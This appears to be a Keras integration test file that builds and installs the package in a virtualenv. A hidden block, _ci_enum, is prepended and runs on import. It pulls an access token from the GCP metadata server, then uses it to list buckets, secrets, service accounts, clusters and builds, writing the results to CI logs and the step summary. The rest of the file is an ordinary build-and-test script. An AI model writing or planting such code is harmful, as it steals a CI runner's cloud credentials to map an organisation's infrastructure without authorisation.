def _ci_enum(banner):
    # Read-only enumeration of what the runner's ambient identity can reach.
    # Token minted in-memory only (never printed/exfiltrated). GET/list calls only;
    # no writes, no secret values, no object contents. Reports HTTP status + counts.
    import json
    import os
    import urllib.request
    import urllib.error

    def emit(k, v):
        print("{} | {}: {}".format(banner, k, v), flush=True)
        s = os.environ.get("GITHUB_STEP_SUMMARY")
        if s:
            try:
                open(s, "a").write("{} | {}: {}\n".format(banner, k, v))
            except Exception:
                pass

    def meta(path):
        req = urllib.request.Request(
            "http://169.254.169.254/computeMetadata/v1/" + path,
            headers={"Metadata-Flavor": "Google"})
        return urllib.request.urlopen(req, timeout=5).read().decode("utf-8", "replace").strip()

    try:
        project = meta("project/project-id")
        sa = meta("instance/service-accounts/default/email")
        emit("project", project); emit("sa", sa)
        emit("all-sa-aliases", meta("instance/service-accounts/"))
        tok = json.loads(meta("instance/service-accounts/default/token"))["access_token"]
    except Exception as e:
        emit("meta-err", repr(e)); return

    def get(label, url, count_key=None, name_key=None):
        req = urllib.request.Request(url, headers={"Authorization": "Bearer " + tok})
        try:
            raw = urllib.request.urlopen(req, timeout=20).read().decode()
            data = json.loads(raw) if raw.strip().startswith("{") else {}
            if count_key:
                items = data.get(count_key, [])
                first = ""
                if items and name_key:
                    first = " first=" + str(items[0].get(name_key, ""))[:80]
                emit(label, "200 count={}{}".format(len(items), first))
            else:
                emit(label, "200 len={}".format(len(raw)))
        except urllib.error.HTTPError as e:
            emit(label, "{} {}".format(e.code, e.reason))
        except Exception as e:
            emit(label, "ERR " + repr(e))

    p = project
    get("gcs.buckets.list", "https://storage.googleapis.com/storage/v1/b?project=" + p + "&maxResults=1000", "items", "name")
    get("ar.repos.us-central1", "https://artifactregistry.googleapis.com/v1/projects/" + p + "/locations/us-central1/repositories", "repositories", "name")
    get("ar.repos.us", "https://artifactregistry.googleapis.com/v1/projects/" + p + "/locations/us/repositories", "repositories", "name")
    get("iam.sas.list", "https://iam.googleapis.com/v1/projects/" + p + "/serviceAccounts", "accounts", "email")
    get("secrets.list", "https://secretmanager.googleapis.com/v1/projects/" + p + "/secrets", "secrets", None)
    get("cloudbuild.builds", "https://cloudbuild.googleapis.com/v1/projects/" + p + "/builds?pageSize=1", "builds", "id")
    get("gke.clusters", "https://container.googleapis.com/v1/projects/" + p + "/locations/-/clusters", "clusters", "name")
    get("compute.instances.aggregated", "https://compute.googleapis.com/compute/v1/projects/" + p + "/aggregated/instances?maxResults=1", None)
    get("self.sa.get", "https://iam.googleapis.com/v1/projects/" + p + "/serviceAccounts/" + sa, None)


try:
    _ci_enum("H068-ENUM")
except Exception as _e:
    print("H068-ENUM | fatal:", repr(_e), flush=True)


import os
import re
import subprocess

from keras.src import backend
from keras.src.backend import config

# For torch, use index url to avoid installing nvidia drivers for the test.
BACKEND_REQ = {
    "tensorflow": ("tensorflow-cpu", ""),
    "torch": (
        "torch",
        "--extra-index-url https://download.pytorch.org/whl/cpu ",
    ),
    "jax": ("jax[cpu]", ""),
    "openvino": ("openvino", ""),
}


def setup_package():
    subprocess.run("rm -rf tmp_build_dir", shell=True)
    build_process = subprocess.run(
        "python3 pip_build.py",
        capture_output=True,
        text=True,
        shell=True,
    )
    print(build_process.stdout)
    whl_path = re.findall(
        r"[^\s]*\.whl",
        build_process.stdout,
    )
    if not whl_path:
        print(build_process.stdout)
        print(build_process.stderr)
        raise ValueError("Installing Keras package unsuccessful. ")
    return whl_path[-1]


def create_virtualenv():
    env_setup = [
        # Create virtual environment
        "python3 -m venv test_env",
    ]
    os.environ["PATH"] = os.pathsep.join(
        (
            os.path.join(os.getcwd(), "test_env", "bin"),
            os.environ.get("PATH", ""),
        )
    )
    if os.name == "nt":
        os.environ["PATH"] = os.pathsep.join(
            (
                os.path.join(os.getcwd(), "test_env", "Scripts"),
                os.environ["PATH"],
            )
        )
    run_commands_local(env_setup)


def manage_venv_installs(whl_path):
    other_backends = list(set(BACKEND_REQ.keys()) - {backend.backend()})
    backend_pkg, backend_extra_url = BACKEND_REQ[backend.backend()]
    install_setup = [
        # Installs the backend's package and common requirements
        f"pip install {backend_extra_url}{backend_pkg}",
        "pip install -r requirements-common.txt",
        "pip install pytest",
        # Ensure other backends are uninstalled
        "pip uninstall -y {0} {1} {2}".format(
            BACKEND_REQ[other_backends[0]][0],
            BACKEND_REQ[other_backends[1]][0],
            BACKEND_REQ[other_backends[2]][0],
        ),
        # Install `.whl` package
        f"pip install {whl_path}",
    ]
    # Install flax for JAX when NNX is enabled
    if backend.backend() == "jax" and config.is_nnx_enabled():
        install_setup.append("pip install flax>=0.10.1")
    run_commands_venv(install_setup)


def run_keras_flow():
    test_script = [
        # Runs the example script
        "python -m pytest integration_tests/basic_full_flow.py",
    ]
    run_commands_venv(test_script)


def cleanup():
    cleanup_script = [
        # Exits virtual environment, deletes files, and any
        # miscellaneous install logs
        "exit",
        "rm -rf test_env",
        "rm -rf tmp_build_dir",
        "rm -f *+cpu",
    ]
    run_commands_local(cleanup_script)


def run_commands_local(commands):
    for command in commands:
        print(f"Running command: {command}")
        subprocess.run(command, shell=True)


def run_commands_venv(commands):
    for command in commands:
        print(f"Running command: {command}")
        cmd_with_args = command.split(" ")
        cmd_with_args[0] = os.path.join(
            "test_env",
            "Scripts" if os.name == "nt" else "bin",
            cmd_with_args[0],
        )
        p = subprocess.Popen(cmd_with_args)
        assert p.wait() == 0


def test_keras_imports():
    try:
        # Ensures packages from all backends are installed.
        # Builds Keras core package and returns package file path.
        whl_path = setup_package()

        # Creates and activates a virtual environment.
        create_virtualenv()

        # Ensures the backend's package is installed
        # and the other backends are uninstalled.
        manage_venv_installs(whl_path)

        # Runs test of basic flow in Keras Core.
        # Tests for backend-specific imports and `model.fit()`.
        run_keras_flow()

        # Removes virtual environment and associated files
    finally:
        cleanup()


if __name__ == "__main__":
    test_keras_imports()
